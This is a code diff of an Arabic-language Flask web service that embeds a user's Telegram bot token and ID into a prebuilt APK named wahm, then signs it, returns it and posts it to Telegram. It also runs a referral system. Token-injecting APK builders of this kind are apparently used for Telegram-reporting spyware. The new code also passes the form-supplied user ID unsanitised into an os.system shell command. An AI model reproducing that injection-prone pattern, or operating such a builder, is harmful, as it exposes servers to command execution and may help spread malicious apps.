@@ -59,21 +59,19 @@ def update_user_attempts(user_id):
         return True
     return False
 
+# دالة إرسال الملف عبر الخلفية (Background Thread) لتسريع الاستجابة وعدم التعليق
 def send_apk_to_telegram(chat_id, file_path):
     if not TELEGRAM_BOT_TOKEN or not chat_id or chat_id == 'unknown':
         return
     try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
         caption_msg = f"✨ **تم توليد وتوقيع تطبيق وَهْم بنجاح!**\n👤 معرّف المستخدم: `{chat_id}`\n🛠 خدمة: **wahmapk** | **g5wbot**\n🌐 منصة فخم: fokhm.com"
-        
         with open(file_path, 'rb') as apk_file:
-            files = {'document': ('wahm_customized.apk', apk_file)}
-            data = {
-                'chat_id': chat_id,
-                'caption': caption_msg,
-                'parse_mode': 'Markdown'
-            }
-            requests.post(url, data=data, files=files, timeout=60)
+            requests.post(
+                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
+                data={'chat_id': chat_id, 'caption': caption_msg, 'parse_mode': 'Markdown'},
+                files={'document': ('wahm_g5wbot.apk', apk_file)},
+                timeout=60
+            )
     except Exception as e:
         print(f"Background Telegram send error: {e}")
 
@@ -90,7 +88,7 @@ HTML_TEMPLATE = """
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&display=swap');
         body { font-family: 'Cairo', sans-serif; background-color: #0c0814; color: #f8fafc; }
-        .glass-box { background: rgba(26, 18, 48, 0.75); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); border: 1px solid rgba(168, 85, 247, 0.2); }
+        .glass-box { background: rgba(26, 18, 48, 0.7); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); border: 1px solid rgba(168, 85, 247, 0.2); }
         .purple-glow { box-shadow: 0 0 35px rgba(168, 85, 247, 0.25); }
         .btn-gradient { background: linear-gradient(135deg, #a855f7 0%, #ec4899 100%); }
         .btn-gradient:hover { background: linear-gradient(135deg, #9333ea 0%, #db2777 100%); }
@@ -111,7 +109,7 @@ HTML_TEMPLATE = """
             <p class="text-[11px] text-purple-300/80">منصة فخم الماسية لتخصيص وتوقيع تطبيقات وَهْم</p>
         </div>
 
-        <!-- User Stats Card -->
+        <!-- User Stats & Attempts Card -->
         <div class="bg-purple-950/50 border border-purple-500/30 rounded-2xl p-3.5 relative z-10 flex items-center justify-between shadow-inner">
             <div class="flex items-center gap-3">
                 <div class="w-10 h-10 rounded-xl bg-purple-500/20 flex items-center justify-center text-purple-300">
@@ -129,18 +127,16 @@ HTML_TEMPLATE = """
         </div>
 
         <!-- Navigation Tabs -->
-        <div class="grid grid-cols-3 gap-1.5 bg-purple-950/40 p-1 rounded-2xl border border-purple-500/25 relative z-10 text-center">
-            <button onclick="switchTab('generator')" id="tabGenBtn" class="py-2 text-[11px] font-bold rounded-xl transition bg-purple-600 text-white shadow">الأساسي</button>
-            <button onclick="switchTab('advanced')" id="tabAdvBtn" class="py-2 text-[11px] font-bold rounded-xl transition text-purple-300 hover:text-white">التعديلات ⚙️</button>
-            <button onclick="switchTab('invites')" id="tabInvBtn" class="py-2 text-[11px] font-bold rounded-xl transition text-purple-300 hover:text-white">الدعوات 🔥</button>
+        <div class="grid grid-cols-2 gap-2 bg-purple-950/30 p-1 rounded-2xl border border-purple-500/25 relative z-10">
+            <button onclick="switchTab('generator')" id="tabGenBtn" class="py-2 text-xs font-bold rounded-xl transition bg-purple-600 text-white shadow">صنع وتوقيع</button>
+            <button onclick="switchTab('invites')" id="tabInvBtn" class="py-2 text-xs font-bold rounded-xl transition text-purple-300 hover:text-white">نظام الدعوات 🔥</button>
         </div>
 
-        <!-- MAIN FORM -->
-        <form id="injectForm" class="space-y-3 relative z-10">
-            <!-- TAB 1: Generator Form -->
-            <div id="tabGenerator" class="space-y-3">
+        <!-- TAB 1: Generator Form -->
+        <div id="tabGenerator" class="space-y-3 relative z-10">
+            <form id="injectForm" class="space-y-3">
                 <div>
-                    <label class="block text-xs font-bold text-purple-200 mb-1.5 mr-1"><i class="fa-solid fa-key text-amber-400 ml-1"></i> أدخل توكن البوت:</label>
+                    <label class="block text-xs font-bold text-purple-200 mb-1.5 mr-1">أدخل توكن البوت:</label>
                     <div class="relative">
                         <input type="password" id="tokenInput" name="token" required class="w-full bg-purple-950/60 border border-purple-500/30 rounded-2xl p-3 text-xs text-white focus:outline-none focus:border-purple-400 transition placeholder:text-purple-400/40 shadow-inner" placeholder="الصق التوكن هنا...">
                         <button type="button" onclick="togglePassword()" class="absolute left-3.5 top-3 text-purple-400 hover:text-white text-xs">
@@ -148,61 +144,43 @@ HTML_TEMPLATE = """
                         </button>
                     </div>
                 </div>
-            </div>
 
-            <!-- TAB 2: Advanced Customizations (URL, Name, Icon) -->
-            <div id="tabAdvanced" class="hidden space-y-3">
-                <!-- URL Customization -->
-                <div>
-                    <label class="block text-xs font-bold text-purple-200 mb-1 mr-1"><i class="fa-solid fa-link text-purple-400 ml-1"></i> رابط التطبيق (assets/url.txt):</label>
-                    <input type="url" id="appUrl" name="app_url" class="w-full bg-purple-950/60 border border-purple-500/30 rounded-xl p-2.5 text-xs text-white focus:outline-none focus:border-purple-400 transition placeholder:text-purple-400/40" placeholder="https://example.com">
+                <div id="errorBanner" class="hidden bg-red-950/50 border border-red-500/30 text-red-300 p-3 rounded-xl text-xs flex items-center gap-2">
+                    <i class="fa-solid fa-circle-exclamation text-red-400"></i>
+                    <span id="errorText">حدث خطأ ما</span>
                 </div>
 
-                <!-- App Name Customization -->
-                <div>
-                    <label class="block text-xs font-bold text-purple-200 mb-1 mr-1"><i class="fa-solid fa-signature text-purple-400 ml-1"></i> اسم التطبيق الجديد:</label>
-                    <input type="text" id="appName" name="app_name" class="w-full bg-purple-950/60 border border-purple-500/30 rounded-xl p-2.5 text-xs text-white focus:outline-none focus:border-purple-400 transition placeholder:text-purple-400/40" placeholder="اسم التطبيق (اختياري)">
+                <button type="submit" id="submitBtn" class="w-full btn-gradient text-white font-bold py-3.5 rounded-2xl transition duration-300 shadow-lg shadow-purple-500/25 flex items-center justify-center gap-2 cursor-pointer active:scale-95 text-xs">
+                    <span>بدء المعالجة والتوقيع الفوري</span>
+                </button>
+            </form>
+        </div>
+
+        <!-- TAB 2: Invites System -->
+        <div id="tabInvites" class="hidden space-y-3 relative z-10 text-center">
+            <div class="bg-purple-950/60 border border-purple-500/30 rounded-2xl p-4 space-y-2">
+                <div class="w-10 h-10 bg-amber-500/20 text-amber-400 rounded-xl mx-auto flex items-center justify-center text-lg">
+                    <i class="fa-solid fa-bullhorn"></i>
+                </div>
+                <h3 class="text-xs font-bold text-white">رابط دعوة wahmapk الحصري!</h3>
+                <p class="text-[11px] text-purple-300/80 leading-relaxed">
+                    شارك رابط الـ Web App أدناه. عند دعوة 5 أشخاص جدد، سيتحول حسابك تلقائياً إلى وضع (غير محدود - Unlimited) مدى الحياة!
+                </p>
+                
+                <div class="pt-1">
+                    <span class="text-[10px] text-purple-400">عدد الأعضاء المدعوين:</span>
+                    <div class="text-lg font-black text-amber-400" id="invitesCount">0 / 5</div>
                 </div>
 
-                <!-- App Icon Customization -->
-                <div>
-                    <label class="block text-xs font-bold text-purple-200 mb-1 mr-1"><i class="fa-solid fa-image text-purple-400 ml-1"></i> أيقونة التطبيق (صورة PNG):</label>
-                    <input type="file" id="appIcon" name="app_icon" accept="image/png, image/jpeg" class="w-full bg-purple-950/60 border border-purple-500/30 rounded-xl p-2 text-xs text-purple-300 file:ml-4 file:py-1.5 file:px-3 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-purple-600 file:text-white hover:file:bg-purple-500 cursor-pointer">
+                <div class="w-full bg-purple-950 rounded-full h-2 p-0.5 border border-purple-500/20 overflow-hidden">
+                    <div id="invitesBar" class="bg-gradient-to-r from-amber-500 to-yellow-400 h-full rounded-full transition-all duration-300 w-0"></div>
                 </div>
-            </div>
 
-            <!-- TAB 3: Invites System -->
-            <div id="tabInvites" class="hidden space-y-3 text-center">
-                <div class="bg-purple-950/60 border border-purple-500/30 rounded-2xl p-4 space-y-2">
-                    <div class="w-10 h-10 bg-amber-500/20 text-amber-400 rounded-xl mx-auto flex items-center justify-center text-lg">
-                        <i class="fa-solid fa-bullhorn"></i>
-                    </div>
-                    <h3 class="text-xs font-bold text-white">رابط دعوة wahmapk الحصري!</h3>
-                    <p class="text-[11px] text-purple-300/80 leading-relaxed">
-                        شارك رابط الـ Web App أدناه. عند دعوة 5 أشخاص جدد، سيتحول حسابك تلقائياً إلى وضع (غير محدود - Unlimited) مدى الحياة!
-                    </p>
-                    <div class="pt-1">
-                        <span class="text-[10px] text-purple-400">عدد الأعضاء المدعوين:</span>
-                        <div class="text-lg font-black text-amber-400" id="invitesCount">0 / 5</div>
-                    </div>
-                    <div class="w-full bg-purple-950 rounded-full h-2 p-0.5 border border-purple-500/20 overflow-hidden">
-                        <div id="invitesBar" class="bg-gradient-to-r from-amber-500 to-yellow-400 h-full rounded-full transition-all duration-300 w-0"></div>
-                    </div>
-                    <button type="button" onclick="copyInviteLink()" class="w-full bg-purple-600 hover:bg-purple-500 text-white font-bold py-2.5 rounded-xl text-xs transition shadow flex items-center justify-center gap-2 mt-2">
-                        <i class="fa-solid fa-copy"></i> نسخ رابط الدعوة الخاص بك
-                    </button>
-                </div>
+                <button onclick="copyInviteLink()" class="w-full bg-purple-600 hover:bg-purple-500 text-white font-bold py-2.5 rounded-xl text-xs transition shadow flex items-center justify-center gap-2 mt-2">
+                    <i class="fa-solid fa-copy"></i> نسخ رابط الدعوة الخاص بك
+                </button>
             </div>
-
-            <div id="errorBanner" class="hidden bg-red-950/50 border border-red-500/30 text-red-300 p-3 rounded-xl text-xs flex items-center gap-2">
-                <i class="fa-solid fa-circle-exclamation text-red-400"></i>
-                <span id="errorText">حدث خطأ ما</span>
-            </div>
-
-            <button type="submit" id="submitBtn" class="w-full btn-gradient text-white font-bold py-3.5 rounded-2xl transition duration-300 shadow-lg shadow-purple-500/25 flex items-center justify-center gap-2 cursor-pointer active:scale-95 text-xs mt-3">
-                <span>بدء المعالجة والتوقيع الفوري</span>
-            </button>
-        </form>
+        </div>
 
         <!-- Live Progress (Hidden) -->
         <div id="progressBox" class="hidden space-y-3 relative z-10 py-2">
@@ -271,6 +249,7 @@ HTML_TEMPLATE = """
             }
         }
         document.getElementById('userId').value = currentUserId;
+        
         inviteLink = `https://t.me/g5wbot/wahmapk?startapp=ref_${currentUserId}`;
 
         async function initUserData() {
@@ -282,6 +261,7 @@ HTML_TEMPLATE = """
                         body: JSON.stringify({ referrer_id: referrerId, new_user_id: currentUserId })
                     });
                 }
+
                 const res = await fetch(`/api/user?user_id=${currentUserId}`);
                 const data = await res.json();
                 
@@ -292,44 +272,40 @@ HTML_TEMPLATE = """
                     document.getElementById('accountStatusText').innerText = 'حساب تجريبي';
                     document.getElementById('attemptsBadge').innerText = data.attempts + ' محاولات';
                 }
+
                 document.getElementById('invitesCount').innerText = `${data.invites} / 5`;
                 let percent = (data.invites / 5) * 100;
                 if (percent > 100) percent = 100;
                 document.getElementById('invitesBar').style.width = percent + '%';
-            } catch(e) {}
+
+            } catch(e) {
+                console.log('Error initializing user data');
+            }
         }
         initUserData();
 
         function switchTab(tab) {
             const genTab = document.getElementById('tabGenerator');
-            const advTab = document.getElementById('tabAdvanced');
             const invTab = document.getElementById('tabInvites');
             const genBtn = document.getElementById('tabGenBtn');
-            const advBtn = document.getElementById('tabAdvBtn');
             const invBtn = document.getElementById('tabInvBtn');
-
-            genTab.classList.add('hidden');
-            advTab.classList.add('hidden');
-            invTab.classList.add('hidden');
-            genBtn.className = 'py-2 text-[11px] font-bold rounded-xl transition text-purple-300 hover:text-white';
-            advBtn.className = 'py-2 text-[11px] font-bold rounded-xl transition text-purple-300 hover:text-white';
-            invBtn.className = 'py-2 text-[11px] font-bold rounded-xl transition text-purple-300 hover:text-white';
 
             if (tab === 'generator') {
                 genTab.classList.remove('hidden');
-                genBtn.className = 'py-2 text-[11px] font-bold rounded-xl transition bg-purple-600 text-white shadow';
-            } else if (tab === 'advanced') {
-                advTab.classList.remove('hidden');
-                advBtn.className = 'py-2 text-[11px] font-bold rounded-xl transition bg-purple-600 text-white shadow';
+                invTab.classList.add('hidden');
+                genBtn.className = 'py-2 text-xs font-bold rounded-xl transition bg-purple-600 text-white shadow';
+                invBtn.className = 'py-2 text-xs font-bold rounded-xl transition text-purple-300 hover:text-white';
             } else {
+                genTab.classList.add('hidden');
                 invTab.classList.remove('hidden');
-                invBtn.className = 'py-2 text-[11px] font-bold rounded-xl transition bg-purple-600 text-white shadow';
+                invBtn.className = 'py-2 text-xs font-bold rounded-xl transition bg-purple-600 text-white shadow';
+                genBtn.className = 'py-2 text-xs font-bold rounded-xl transition text-purple-300 hover:text-white';
             }
         }
 
         function copyInviteLink() {
             navigator.clipboard.writeText(inviteLink);
-            alert('✨ تم نسخ رابط دعوة (wahmapk) المخصص بنجاح!');
+            alert('✨ تم نسخ رابط دعوة (wahmapk) المخصص بنجاح! انشره الآن لجمع أعضاء جدد.');
         }
 
         function togglePassword() {
@@ -370,10 +346,10 @@ HTML_TEMPLATE = """
             percentText.innerText = currentProgress + '%';
 
             const stages = [
-                { p: 30, text: "جاري التحقق من الرصيد وفك الحزمة..." },
-                { p: 60, text: "جاري حقن التوكن، الرابط، وتغيير الأيقونة والاسم..." },
-                { p: 85, text: "جاري إعادة بناء الحزمة ومحاذاة zipalign..." },
-                { p: 98, text: "جاري التوقيع الرقمي وإرسال النسخة..." }
+                { p: 30, text: "جاري التحقق من رصيد محاولات الخدمة..." },
+                { p: 60, text: "جاري حقن ملفات التوكن والمعرّف داخل الحزمة..." },
+                { p: 85, text: "جاري تطبيق المحاذاة والتوقيع الرقمي الآمن..." },
+                { p: 98, text: "جاري تجهيز الملف للتحميل المباشر..." }
             ];
 
             let stageIdx = 0;
@@ -387,10 +363,11 @@ HTML_TEMPLATE = """
                         stageIdx++;
                     }
                 }
-            }, 250);
+            }, 200);
 
             try {
-                const formData = new FormData(form);
+                const formData = new FormData();
+                formData.append('token', token);
                 formData.append('user_id', currentUserId);
 
                 const response = await fetch('/generate', {
@@ -402,7 +379,7 @@ HTML_TEMPLATE = """
 
                 if (!response.ok) {
                     const errRes = await response.text();
-                    throw new Error(errRes || 'حدث خطأ أثناء المعالجة.');
+                    throw new Error(errRes || 'انتهت محاولاتك! ادعُ أصدقائك عبر رابط الـ Web App لفتح الصنع اللانهائي.');
                 }
 
                 progressBar.style.width = '100%';
@@ -455,9 +432,6 @@ HTML_TEMPLATE = """
             resultBox.classList.add('hidden');
             form.classList.remove('hidden');
             document.getElementById('tokenInput').value = '';
-            document.getElementById('appUrl').value = '';
-            document.getElementById('appName').value = '';
-            document.getElementById('appIcon').value = '';
             progressBar.style.width = '0%';
             errorBanner.classList.add('hidden');
             initUserData();
@@ -487,12 +461,19 @@ def register_invite():
         return jsonify({'status': 'ignored'})
 
     users = load_users()
+    
     if referrer_id not in users:
         get_user_info(referrer_id)
         users = load_users()
 
     if new_user_id not in users:
-        users[new_user_id] = {'attempts': 2, 'invites': 0, 'unlimited': False, 'invited_list': [], 'referred_by': referrer_id}
+        users[new_user_id] = {
+            'attempts': 2,
+            'invites': 0,
+            'unlimited': False,
+            'invited_list': [],
+            'referred_by': referrer_id
+        }
     else:
         if not users[new_user_id].get('referred_by'):
             users[new_user_id]['referred_by'] = referrer_id
@@ -500,8 +481,10 @@ def register_invite():
     if new_user_id not in users[referrer_id].get('invited_list', []):
         users[referrer_id].setdefault('invited_list', []).append(new_user_id)
         users[referrer_id]['invites'] = len(users[referrer_id]['invited_list'])
+        
         if users[referrer_id]['invites'] >= 5:
             users[referrer_id]['unlimited'] = True
+            
         save_users(users)
         return jsonify({'status': 'success', 'invites': users[referrer_id]['invites']})
 
@@ -511,10 +494,7 @@ def register_invite():
 @app.route('/generate', methods=['POST'])
 def generate():
     token_text = request.form.get('token')
-    app_url = request.form.get('app_url', '').strip()
-    app_name = request.form.get('app_name', '').strip()
     user_id = request.form.get('user_id', '8349168441')
-    icon_file = request.files.get('app_icon')
 
     if not token_text:
         return "الرجاء إدخال التوكن!", 400
@@ -526,85 +506,49 @@ def generate():
     if not os.path.exists(BASE_APK):
         return "خطأ: ملف التطبيق الأساسي (wahm.apk) غير موجود على السيرفر!", 500
 
-    work_dir = os.path.join(UPLOAD_FOLDER, f'apk_work_{user_id}')
-    decoded_dir = os.path.join(work_dir, 'decoded')
-    unsigned_apk = os.path.join(work_dir, 'unsigned.apk')
-    aligned_apk = os.path.join(work_dir, 'aligned.apk')
+    modified_apk = os.path.join(UPLOAD_FOLDER, f'wahm_mod_{user_id}.apk')
+    aligned_apk = os.path.join(UPLOAD_FOLDER, f'wahm_aligned_{user_id}.apk')
     signed_apk = os.path.join(UPLOAD_FOLDER, f'wahm_signed_{user_id}.apk')
 
     try:
         if not user_info['unlimited']:
             update_user_attempts(user_id)
 
-        # تنظيف العمليات السابقة
-        import shutil
-        if os.path.exists(work_dir):
-            shutil.rmtree(work_dir)
-        os.makedirs(work_dir, exist_ok=True)
-        if os.path.exists(signed_apk):
-            os.remove(signed_apk)
+        for f in [modified_apk, aligned_apk, signed_apk]:
+            if os.path.exists(f):
+                os.remove(f)
 
-        # 1. استخدام apktool لفك الحزمة لتعديل الاسم، الأيقونة، وملفات assets
-        decode_cmd = ['apktool', 'd', BASE_APK, '-o', decoded_dir, '-f']
-        res_dec = subprocess.run(decode_cmd, capture_output=True, text=True)
-        if res_dec.returncode != 0:
-            # طريقة بديلة في حال فشل apktool (الحقن المباشر للـ ZIP كخيار احتياطي سريع)
-            return f"خطأ في فك حزمة APK عبر apktool: {res_dec.stderr}", 500
+        os.system(f"cp {BASE_APK} {modified_apk}")
 
-        # 2. حقن token.txt
-        token_path = os.path.join(decoded_dir, 'assets', 'token.txt')
-        os.makedirs(os.path.dirname(token_path), exist_ok=True)
-        with open(token_path, 'w', encoding='utf-8') as f:
-            f.write(token_text)
+        token_path_in_zip = 'assets/token.txt'
+        id_path_in_zip = 'assets/id.txt'
+        temp_zip = os.path.join(UPLOAD_FOLDER, 'temp.zip')
+        
+        with zipfile.ZipFile(modified_apk, 'r') as zin:
+            with zipfile.ZipFile(temp_zip, 'w') as zout:
+                token_exists = False
+                id_exists = False
+                for item in zin.infolist():
+                    if item.filename.startswith('META-INF/'):
+                        continue
+                    if item.filename == token_path_in_zip:
+                        token_exists = True
+                        zout.writestr(item, token_text.encode('utf-8'))
+                    elif item.filename == id_path_in_zip:
+                        id_exists = True
+                        zout.writestr(item, str(user_id).encode('utf-8'))
+                    else:
+                        zout.writestr(item, zin.read(item.filename))
+                
+                if not token_exists:
+                    zout.writestr(token_path_in_zip, token_text.encode('utf-8'))
+                if not id_exists:
+                    zout.writestr(id_path_in_zip, str(user_id).encode('utf-8'))
 
-        # 3. حقن id.txt
-        id_path = os.path.join(decoded_dir, 'assets', 'id.txt')
-        with open(id_path, 'w', encoding='utf-8') as f:
-            f.write(str(user_id))
+        os.replace(temp_zip, modified_apk)
 
-        # 4. حقن وتعديل assets/url.txt إذا تم إدخاله
-        if app_url:
-            url_path = os.path.join(decoded_dir, 'assets', 'url.txt')
-            with open(url_path, 'w', encoding='utf-8') as f:
-                f.write(app_url)
+        subprocess.run(['zipalign', '-v', '-p', '4', modified_apk, aligned_apk], check=True)
 
-        # 5. تعديل اسم التطبيق إذا تم إدخاله (عبر تعديل strings.xml أو AndroidManifest)
-        if app_name:
-            strings_path = os.path.join(decoded_dir, 'res', 'values', 'strings.xml')
-            if os.path.exists(strings_path):
-                with open(strings_path, 'r', encoding='utf-8') as f:
-                    xml_content = f.read()
-                # تعديل اسم التطبيق الافتراضي داخل الـ strings.xml
-                import re
-                xml_content = re.sub(r'<string name="app_name">.*?</string>', f'<string name="app_name">{app_name}</string>', xml_content)
-                with open(strings_path, 'w', encoding='utf-8') as f:
-                    f.write(xml_content)
-
-        # 6. تعديل أيقونة التطبيق إذا قام المستخدم برفع صورة
-        if icon_file and icon_file.filename != '':
-            icon_save_path = os.path.join(work_dir, 'custom_icon.png')
-            icon_file.save(icon_save_path)
-            # البحث عن مجلدات الـ mipmap واختبار استبدال الأيقونة الافتراضية
-            res_dir = os.path.join(decoded_dir, 'res')
-            if os.path.exists(res_dir):
-                for root, dirs, files in os.walk(res_dir):
-                    for file in files:
-                        if 'ic_launcher' in file and file.endswith('.png'):
-                            try:
-                                shutil.copy(icon_save_path, os.path.join(root, file))
-                            except:
-                                pass
-
-        # 7. إعادة بناء الحزمة (Build APK) باستخدام apktool
-        build_cmd = ['apktool', 'b', decoded_dir, '-o', unsigned_apk]
-        res_build = subprocess.run(build_cmd, capture_output=True, text=True)
-        if res_build.returncode != 0:
-            return f"فشل بناء الحزمة بعد التعديلات: {res_build.stderr}", 500
-
-        # 8. محاذاة الملف (zipalign)
-        subprocess.run(['zipalign', '-v', '-p', '4', unsigned_apk, aligned_apk], check=True)
-
-        # 9. توليد المفتاح تلقائياً إن لم يكن موجوداً
         global KEYSTORE
         if not os.path.exists(KEYSTORE):
             subprocess.run([
@@ -619,7 +563,6 @@ def generate():
                 '-dname', 'CN=g5wbot, OU=Dev, O=g5wbot, L=Riyadh, S=Riyadh, C=SA'
             ], check=True)
 
-        # 10. التوقيع باستخدام apksigner
         sign_cmd = [
             'apksigner', 'sign',
             '--ks', KEYSTORE,
@@ -635,11 +578,11 @@ def generate():
         if result.returncode != 0:
             return f"فشل التوقيع بواسطة أداة apksigner: {result.stderr}", 500
 
-        # إرسال الملف للبوت عبر خيط خلفي
+        # إرسال الملف للبوت عبر خيط خلفي (Background Thread) لكي لا يتسبب في تعليق الاستجابة والتحميل
         if TELEGRAM_BOT_TOKEN and user_id and user_id != 'unknown':
             threading.Thread(target=send_apk_to_telegram, args=(user_id, signed_apk)).start()
 
-        return send_file(signed_apk, as_attachment=True, download_name='wahm_customized.apk')
+        return send_file(signed_apk, as_attachment=True, download_name='wahm_g5wbot.apk')
 
     except Exception as e:
         return f"حدث خطأ أثناء المعالجة: {str(e)}", 500
